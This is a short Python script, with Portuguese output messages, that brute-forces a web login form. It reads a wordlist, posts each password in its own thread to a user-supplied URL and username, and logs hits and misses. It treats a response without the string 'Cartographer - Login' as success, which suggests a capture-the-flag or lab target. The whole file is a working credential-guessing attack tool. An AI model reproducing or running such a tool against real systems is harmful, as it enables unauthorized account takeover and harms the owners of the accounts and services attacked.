import requests, time, os, threading, logging, json, datetime

print('* wordlists *')
os.system('tree -fn ../wordlists/')

file_name = input('wordlist name ~> ')
login = input('username ~> ')

url = input('url ~> ')
time_request = input('time request ~> ')

file = open(file_name, 'r')
words = list( map(lambda x: x.replace('\n', ''), file.readlines()) )

print('wordlist com {} palavras.'.format(len(words)))

log_file_name = str(datetime.datetime.now().timestamp())
log_file_name = 'bf-login_'+log_file_name
print('logfile ~> '+log_file_name)

logging.basicConfig(level=logging.INFO, filename='syslog/'+log_file_name,
    format='%(asctime)s : %(message)s', filemode='w', datefmt='%m/%d %H:%I:%M:%S')

params = {}
count = 0
num = int(len(words) / 10)
valor = 0

def Auth(passwd, user):
  try:
    params['password'] = passwd
    params['username'] = user
    response = requests.post(url, data=params)
    if not 'Cartographer - Login' in response.text:
      logging.info('hit ~> '+passwd)
      print('Credentials found!')
      print('{} :: {}'.format(response.status_code, passwd))
      exit(0)
    else:
      logging.info('miss ~> '+passwd)
  except:
			print('error')

init = time.time()
for word in words:
  if count == num:
    print('~> '+str(valor)+'%')
    valor += 10
    count = 0
  else:
    count+=1

  x = threading.Thread(target=Auth, args=(word,login))
  x.start()
  time.sleep(float(time_request))

print('exec time ~> '+str(time.time() - init))
